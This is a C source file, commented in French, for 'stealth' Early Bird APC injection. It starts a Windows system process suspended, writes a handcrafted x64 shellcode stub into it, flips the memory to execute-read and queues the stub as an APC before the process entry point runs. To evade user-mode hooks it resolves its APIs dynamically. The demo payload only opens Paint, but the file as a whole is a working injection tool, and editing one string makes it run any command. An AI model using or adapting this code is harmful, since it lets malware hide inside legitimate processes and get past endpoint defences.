/*
 * ============================================================
 *  apcinject_stealth.c — Version FURTIVE de l'Early Bird APC
 *  Injection (T1055.004)
 * ============================================================
 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ── Layout du stub 49 bytes ── */
#define STUB_STRING_OFFSET  0x25
#define STUB_TOTAL_SIZE     49
#define STUB_STRPTR_OFF     0x02
#define STUB_FNPTR_OFF      0x11
#define WAIT_MS             5000

/* ============================================================
 *  Types pour la résolution dynamique (Anti-User-Mode Hooks)
 * ============================================================ */
typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
typedef BOOL   (WINAPI *pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   (WINAPI *pQueueUserAPC)(PAPCFUNC, HANDLE, DWORD);
typedef BOOL   (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES,
                                          LPSECURITY_ATTRIBUTES, BOOL, DWORD,
                                          LPVOID, LPCSTR, LPSTARTUPINFOA,
                                          LPPROCESS_INFORMATION);
typedef DWORD  (WINAPI *pResumeThread)(HANDLE);

static pVirtualAllocEx     g_VirtualAllocEx;
static pWriteProcessMemory g_WriteProcessMemory;
static pVirtualProtectEx   g_VirtualProtectEx;
static pQueueUserAPC       g_QueueUserAPC;
static pCreateProcessA     g_CreateProcessA;
static pResumeThread       g_ResumeThread;

static int resolve_apis(void) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (!k32) return 0;

    g_VirtualAllocEx     = (pVirtualAllocEx)     GetProcAddress(k32, "VirtualAllocEx");
    g_WriteProcessMemory = (pWriteProcessMemory) GetProcAddress(k32, "WriteProcessMemory");
    g_VirtualProtectEx   = (pVirtualProtectEx)   GetProcAddress(k32, "VirtualProtectEx");
    g_QueueUserAPC       = (pQueueUserAPC)       GetProcAddress(k32, "QueueUserAPC");
    g_CreateProcessA     = (pCreateProcessA)     GetProcAddress(k32, "CreateProcessA");
    g_ResumeThread       = (pResumeThread)       GetProcAddress(k32, "ResumeThread");

    return g_VirtualAllocEx && g_WriteProcessMemory && g_VirtualProtectEx
        && g_QueueUserAPC && g_CreateProcessA && g_ResumeThread;
}

static DWORD find_pid(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static unsigned char *build_winexec_stub(LPVOID remote_base, size_t *out_size) {
    HMODULE hk32 = GetModuleHandleA("kernel32.dll");
    if (!hk32) return NULL;

    FARPROC pWinExec = GetProcAddress(hk32, "WinExec");
    if (!pWinExec) return NULL;

    unsigned char *stub = (unsigned char *)malloc(STUB_TOTAL_SIZE);
    if (!stub) return NULL;

    unsigned char tmpl[] = {
        0x48, 0xb9, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0xba, 0x01, 0x00, 0x00, 0x00,
        0x48, 0xb8, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x48, 0x83, 0xec, 0x28,
        0xff, 0xd0,
        0x48, 0x83, 0xc4, 0x28,
        0xeb, 0xfe
    };
    memcpy(stub, tmpl, sizeof(tmpl));

    const char *cmd = "mspaint.exe";
    memcpy(stub + STUB_STRING_OFFSET, cmd, strlen(cmd) + 1);

    ULONG_PTR str_remote = (ULONG_PTR)remote_base + STUB_STRING_OFFSET;
    memcpy(stub + STUB_STRPTR_OFF, &str_remote, sizeof(ULONG_PTR));

    ULONG_PTR fn_addr = (ULONG_PTR)pWinExec;
    memcpy(stub + STUB_FNPTR_OFF, &fn_addr, sizeof(ULONG_PTR));

    *out_size = STUB_TOTAL_SIZE;
    return stub;
}

/* ============================================================
 *  MAIN — Logs minimalistes, propres et sans caractères spéciaux
 * ============================================================ */
int main(int argc, char **argv) {
    /* Résolution dynamique des API */
    if (!resolve_apis()) {
        printf("[!] Error: Failed to resolve kernel32 APIs.\n");
        return 1;
    }

    char target[MAX_PATH];
    strncpy(target, (argc > 1) ? argv[1] : "notepad.exe", sizeof(target) - 1);
    target[sizeof(target) - 1] = '\0';
    if (!strrchr(target, '.')) strcat(target, ".exe");

    DWORD paint_before = find_pid("mspaint.exe");

    /* Bannière minimale */
    printf("=== Early Bird APC Injection  ===\n");
    printf("Target  : %s\n", target);
    printf("Payload : WinExec(\"mspaint.exe\")\n\n");

    /* ─ 1. Spawn ── */
    printf("[1/6] Spawning target process (suspended)...\n");
    char path[MAX_PATH] = {0};
    UINT n = GetSystemDirectoryA(path, sizeof(path));
    if (!n) { printf("[!] Error: GetSystemDirectoryA failed.\n"); return 1; }
    snprintf(path + n, sizeof(path) - n, "\\%s", target);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!g_CreateProcessA(path, NULL, NULL, NULL, FALSE,
                          CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[!] Error: CreateProcess failed.\n");
        return 1;
    }
    printf("      -> PID: %lu\n\n", (unsigned long)pi.dwProcessId);

    /* ── 2. Allocation RW (No RWX) ── */
    printf("[2/6] Allocating memory (PAGE_READWRITE)...\n");
    LPVOID remote_base = g_VirtualAllocEx(
        pi.hProcess, NULL, STUB_TOTAL_SIZE,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remote_base) {
        printf("[!] Error: VirtualAllocEx failed.\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    printf("      -> Success\n\n");

    /* ── 3. Build Stub ── */
    printf("[3/6] Building shellcode stub (49 bytes)...\n");
    size_t stub_size = 0;
    unsigned char *stub = build_winexec_stub(remote_base, &stub_size);
    if (!stub) {
        printf("[!] Error: Stub generation failed.\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    printf("      -> Success\n\n");

    /* ── 4. Write & Protect (RW -> RX) ── */
    printf("[4/6] Writing payload and switching to PAGE_EXECUTE_READ...\n");
    SIZE_T written = 0;
    if (!g_WriteProcessMemory(pi.hProcess, remote_base, stub, stub_size, &written)
        || written != stub_size) {
        printf("[!] Error: WriteProcessMemory failed.\n");
        free(stub);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    free(stub);

    DWORD old_prot = 0;
    if (!g_VirtualProtectEx(pi.hProcess, remote_base, stub_size,
                            PAGE_EXECUTE_READ, &old_prot)) {
        printf("[!] Error: VirtualProtectEx failed.\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    printf("      -> Success\n\n");

    /* ── 5. Queue APC ─ */
    printf("[5/6] Queuing APC on suspended thread...\n");
    if (!g_QueueUserAPC((PAPCFUNC)remote_base, pi.hThread, 0)) {
        printf("[!] Error: QueueUserAPC failed.\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    printf("      -> Success\n\n");

    /* ── 6. Resume ── */
    printf("[6/6] Resuming thread (APC executes before Entry Point)...\n");
    g_ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    printf("      -> Success\n\n");

    /* ── Verification ── */
    printf("[*] Waiting 5s for payload execution...\n\n");
    Sleep(WAIT_MS);

    DWORD paint_after = find_pid("mspaint.exe");
    printf("=== RESULT ===\n");
    
    if (paint_after && paint_after != paint_before) {
        printf("[PASS] mspaint.exe launched (PID %lu)\n", (unsigned long)paint_after);
        printf("Injection successful via Stealth Early Bird APC.\n");
    } else if (paint_before) {
        printf("[WARN] mspaint.exe was already running.\n");
        printf("Check Task Manager manually to verify injection.\n");
    } else {
        printf("[FAIL] mspaint.exe not detected.\n");
    }
    printf("==============================\n");

    return (paint_after && paint_after != paint_before) ? 0 : 1;
}